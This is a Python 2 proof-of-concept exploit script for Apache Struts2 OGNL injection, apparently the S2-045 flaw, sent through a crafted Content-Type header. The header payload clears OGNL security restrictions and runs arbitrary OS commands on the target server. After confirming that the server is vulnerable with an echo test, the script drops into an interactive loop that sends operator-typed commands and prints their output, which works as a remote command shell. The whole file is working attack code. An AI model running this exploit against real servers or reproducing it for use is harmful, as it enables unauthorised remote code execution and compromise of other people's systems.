#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2017/3/8 上午11:10
# @Author  : Sahinn
# @File    : struts_poc.py
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import httplib
httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'


def poc(url, content="echo Loopholes"):
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+content+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(url, datagen, headers=header)
    response = urllib2.urlopen(request)
    body = response.read()
    return body

url = sys.argv[1]

body = poc(url)
if "Loopholes" in body:
    print "[Loopholes exist]", url

    while 1:
        con = raw_input("[cmd]>>")
        print poc(url, content=con)
